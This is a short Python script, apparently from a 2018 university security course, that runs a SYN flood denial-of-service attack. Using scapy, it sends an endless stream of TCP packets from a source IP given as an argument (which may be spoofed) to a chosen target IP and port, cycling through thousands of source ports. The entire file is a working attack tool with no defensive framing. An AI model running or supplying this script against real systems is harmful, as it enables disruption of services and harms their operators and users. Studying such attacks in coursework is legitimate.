#! /usr/bin/env python

# Security in Computer Systems 2018 - SDU.
# Multiple port SYN Flood Attack.
# @CarlosViescasHuerta.

import sys
from scapy.all import *

# Establish source and target IPs from input arguments
src_ip = sys.argv[1]
dst_ip = sys.argv[2]
dst_port = int(sys.argv[3])

print ("Launching DoS to http://" + dst_ip + ":" + str(dst_port))

# Set counter
i = 0

try:

    while True:

        # Flood from multiple ports 
        for port in range(5001, 50000):

            i = i + 1 
            # Set addresses and send packets
            _ip = IP(src=src_ip, dst=dst_ip)
            _tcp = TCP(sport=port, dport=dst_port)
            packet = _ip / _tcp
            send(packet, inter = .001)
      
            # Print & Update
            print ("Port: " + str(port) + ". Sent packet # " + str(i))

except KeyboardInterrupt:

    print ("\n \n \n \n \n \n \n \n \n \n \n")
    print ("SYN Flood interrupted. Total packets sent: " + str(i))